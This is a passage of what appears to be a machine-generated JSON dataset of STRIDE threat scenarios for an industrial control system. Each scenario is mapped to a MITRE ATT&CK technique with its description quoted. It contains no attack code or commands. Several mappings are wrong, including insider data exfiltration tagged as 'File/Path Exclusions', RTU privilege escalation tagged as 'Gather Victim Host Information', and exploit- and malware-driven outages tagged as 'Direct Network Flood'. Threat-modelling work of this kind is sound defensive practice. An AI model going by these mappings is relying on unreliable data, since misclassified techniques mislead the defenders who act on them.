                {
                    "Assumption": "PLCs do not have tamper-evident seals or logs.",
                    "Role": "System Designer",
                    "Condition": "Valid if tamper-proof measures are not in place."
                },
                {
                    "Assumption": "The attacker has sufficient technical knowledge to reconfigure PLCs.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker is technically skilled."
                }
            ],
            "Potential Impact": "Configuration changes could sabotage operations, leading to system failures.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "physical access",
                "PLCs",
                "configuration"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the MES database and alters production workflow data.",
            "Assumptions": [
                {
                    "Assumption": "Database access controls are weak or missing.",
                    "Role": "Database Administrator",
                    "Condition": "Valid if proper access controls are not enforced."
                },
                {
                    "Assumption": "The attacker has compromised user credentials.",
                    "Role": "Attacker",
                    "Condition": "Valid if credential theft is successful."
                },
                {
                    "Assumption": "Audit logs are not monitored frequently.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if log monitoring is irregular."
                }
            ],
            "Potential Impact": "Altering workflow data can disrupt production schedules, causing delays and financial loss.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database",
                "access control",
                "workflow data"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs unauthorized actions on the MES and denies involvement due to lack of proper logging.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging of user activities in MES.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logging is inadequately configured."
                },
                {
                    "Assumption": "The system lacks non-repudiation controls.",
                    "Role": "System Designer",
                    "Condition": "Valid if non-repudiation measures are not implemented."
                },
                {
                    "Assumption": "Monitoring and alerting of suspicious activities is absent.",
                    "Role": "Security Team",
                    "Condition": "Valid if real-time monitoring is not in place."
                }
            ],
            "Potential Impact": "Lack of accountability, resulting in difficulty in tracking down malicious activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "MES",
                "logging",
                "user activity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user improperly accesses and modifies cloud-stored data but claims innocence due to lack of audit trails.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage lacks detailed audit logs.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Valid if detailed logging is not enabled."
                },
                {
                    "Assumption": "User access control is not properly enforced.",
                    "Role": "System Administrator",
                    "Condition": "Valid if access policies are not stringent."
                },
                {
                    "Assumption": "The system does not perform timely log reviews.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if log reviews are infrequent."
                }
            ],
            "Potential Impact": "Inability to ascertain the culprit of data tampering incidents.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud storage",
                "audit logs",
                "access control"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Disgruntled employee deletes key operational data from the Control Center database and denies action.",
            "Assumptions": [
                {
                    "Assumption": "Database operations are not fully logged.",
                    "Role": "Database Administrator",
                    "Condition": "Valid if logging is not comprehensive."
                },
                {
                    "Assumption": "Employees have broad access to sensitive data.",
                    "Role": "Policy Maker",
                    "Condition": "Valid if RBAC (Role-Based Access Control) is weak."
                },
                {
                    "Assumption": "Lack of supervision on high privilege accounts.",
                    "Role": "Security Team",
                    "Condition": "Valid if privileged account monitoring is missing."
                }
            ],
            "Potential Impact": "Loss of critical operational data, severely impacting manufacturing processes.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "database",
                "data deletion",
                "privilege abuse"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data between field devices and RTUs revealing sensitive process data.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission between devices is unencrypted.",
                    "Role": "System Designer",
                    "Condition": "Valid if encryption is not implemented."
                },
                {
                    "Assumption": "The attacker has the capability to access the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if network defenses are weak."
                },
                {
                    "Assumption": "No use of secure protocols for device communication.",
                    "Role": "System Designer",
                    "Condition": "Valid if secure protocols are ignored."
                }
            ],
            "Potential Impact": "Exposure of sensitive manufacturing data to unauthorized entities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unencrypted data",
                "network",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A compromised gateway reveals data being transmitted to and from the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Gateway is vulnerable to external attacks.",
                    "Role": "System Administrator",
                    "Condition": "Valid if gateway security is inadequate."
                },
                {
                    "Assumption": "Data encryption is not end-to-end.",
                    "Role": "System Designer",
                    "Condition": "Valid if only partial encryption is applied."
                },
                {
                    "Assumption": "The attacker gains control over the gateway.",
                    "Role": "Attacker",
                    "Condition": "Valid if gateway security controls are bypassed."
                }
            ],
            "Potential Impact": "Sensitive data being transmitted to cloud services is exposed, leading to potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "gateway",
                "cloud services",
                "data transmission"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider accesses and exfiltrates sensitive operational data from the MES database.",
            "Assumptions": [
                {
                    "Assumption": "Internal access controls are insufficient.",
                    "Role": "System Administrator",
                    "Condition": "Valid if internal controls are lax."
                },
                {
                    "Assumption": "Monitoring for data exfiltration is absent.",
                    "Role": "Security Team",
                    "Condition": "Valid if DLP (Data Loss Prevention) is not in place."
                },
                {
                    "Assumption": "Employees have access to large amounts of data.",
                    "Role": "Policy Maker",
                    "Condition": "Valid if access permissions are too broad."
                }
            ],
            "Potential Impact": "Leak of proprietary or sensitive data which could lead to competitive disadvantage.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "MES",
                "data exfiltration",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "File/Path Exclusions",
                "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
                "id": "attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9",
                "technique_id": "T1564.012"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms the Control Center with a DDoS attack, rendering it unable to process control commands.",
            "Assumptions": [
                {
                    "Assumption": "Control Center services are exposed to the internet.",
                    "Role": "System Designer",
                    "Condition": "Valid if external-facing without protection."
                },
                {
                    "Assumption": "Traffic filtering mechanisms are insufficient.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if filtering is weak or absent."
                },
                {
                    "Assumption": "No effective DDoS mitigation strategies in place.",
                    "Role": "Security Team",
                    "Condition": "Valid if mitigation strategies are not implemented."
                }
            ],
            "Potential Impact": "Disruption of control commands leading to halted manufacturing operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "Control Center",
                "command processing"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in the SCADA system causing it to shut down or become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "SCADA system uses outdated or vulnerable software.",
                    "Role": "System Administrator",
                    "Condition": "Valid if regular updates are not performed."
                },
                {
                    "Assumption": "Firmware vulnerabilities in RTUs or PLCs.",
                    "Role": "System Designer",
                    "Condition": "Valid if firmware is not updated."
                },
                {
                    "Assumption": "No redundancy in the system.",
                    "Role": "System Administrator",
                    "Condition": "Valid if failover mechanisms are missing."
                }
            ],
            "Potential Impact": "Unavailability of SCADA functions causing loss of control over industrial processes.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "SCADA",
                "vulnerabilities",
                "system shutdown"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware introduced into the field devices causes them to become non-functional, disrupting communication with RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Field devices can be infected with malware.",
                    "Role": "Attacker",
                    "Condition": "Valid if devices are not protected by anti-malware."
                },
                {
                    "Assumption": "Network segmentation is inadequate.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if network zones are not isolated."
                },
                {
                    "Assumption": "Field devices have internet exposure.",
                    "Role": "System Designer",
                    "Condition": "Valid if devices are directly connected to the internet."
                }
            ],
            "Potential Impact": "Operational processes are halted due to loss of field device functionality.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "field devices",
                "communication disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the gateway software to gain administrative privileges and tamper with data.",
            "Assumptions": [
                {
                    "Assumption": "Gateway software contains exploitable vulnerabilities.",
                    "Role": "System Designer",
                    "Condition": "Valid if software is not regularly patched."
                },
                {
                    "Assumption": "Administrative interfaces are exposed.",
                    "Role": "System Administrator",
                    "Condition": "Valid if admin interfaces are internet-facing."
                },
                {
                    "Assumption": "Lack of multi-factor authentication (MFA) for administrative access.",
                    "Role": "System Administrator",
                    "Condition": "Valid if MFA is not implemented."
                }
            ],
            "Potential Impact": "Unauthorized modifications to data compromising system integrity and operations.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "gateway",
                "administrative access",
                "data tampering"
            ],
            "mitre_technique": {
                "name": "Web Shell",
                "description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)",
                "id": "attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb",
                "technique_id": "T1505.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware installed on a compromised RTU allows an attacker to escalate privileges and manipulate system processes.",
            "Assumptions": [
                {
                    "Assumption": "RTU is susceptible to malware.",
                    "Role": "System Designer",
                    "Condition": "Valid if no anti-malware protections are in place."
                },
                {
                    "Assumption": "RTU has unnecessary or over-privileged accounts.",
                    "Role": "System Administrator",
                    "Condition": "Valid if user roles are not properly managed."
                },
                {
                    "Assumption": "The attacker has initial access to the RTU.",
                    "Role": "Attacker",
                    "Condition": "Valid if there are weak defenses."
                }
            ],
            "Potential Impact": "Compromised RTU can lead to unauthorized control of industrial processes.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "RTU",
                "malware",
                "system processes"
            ],
            "mitre_technique": {
                "name": "Gather Victim Host Information",
                "description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                "id": "attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f",
                "technique_id": "T1592"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a vulnerability in the MES to gain higher privileges and disrupt production workflows.",
            "Assumptions": [
                {
                    "Assumption": "MES contains unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Valid if system is not regularly updated."
                },
                {
                    "Assumption": "Authentication mechanisms are weak.",
                    "Role": "System Designer",
                    "Condition": "Valid if MFA is not enforced."
                },
                {
                    "Assumption": "Monitoring access to high-privilege functions is insufficient.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if access monitoring is weak."
                }
            ],
            "Potential Impact": "Attack can lead to disruption of production and unauthorized access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "MES",
                "production workflow",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "25",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to the Control Center by impersonating an authorized operator.",
            "Assumptions": [
                {
                    "Assumption": "Lack of strong multi-factor authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Valid when only basic password authentication is used."
                },
                {
                    "Assumption": "Network traffic between the operator and the Control Center is not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if encryption protocols like TLS are not implemented."
                }
            ],
            "Potential Impact": "Unauthorized access to Control Center allowing attacker to issue control commands.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "authentication bypass",
                "control center",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics a legitimate field device to send false data to the RTU.",
            "Assumptions": [
                {
                    "Assumption": "Field devices' identities are not strongly verified before communication.",
                    "Role": "Attacker",
                    "Condition": "Valid if there is no device authentication protocol."
                },
                {
                    "Assumption": "RTU does not validate the integrity of incoming data packets.",
                    "Role": "Attacker",
                    "Condition": "Valid if data integrity checks such as checksums or cryptographic validations are not in place."
                }
            ],
            "Potential Impact": "Corruption of data and possible disruption of industrial processes.",
            "MITRE ATT&CK Keywords": [
                "device spoofing",
                "data integrity",
                "RTU",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised gateway to impersonate the cloud service.",
            "Assumptions": [
                {
                    "Assumption": "The gateway's security protocols can be bypassed.",
                    "Role": "Attacker",
                    "Condition": "Valid if the gateway software has vulnerabilities."
                },
                {
                    "Assumption": "The cloud service does not verify the identity of the gateway thoroughly.",
                    "Role": "Attacker",
                    "Condition": "Valid if the cloud service lacks rigorous identity verification processes."
                }
            ],
            "Potential Impact": "Exposure of sensitive data and potential control of data flow.",
            "MITRE ATT&CK Keywords": [
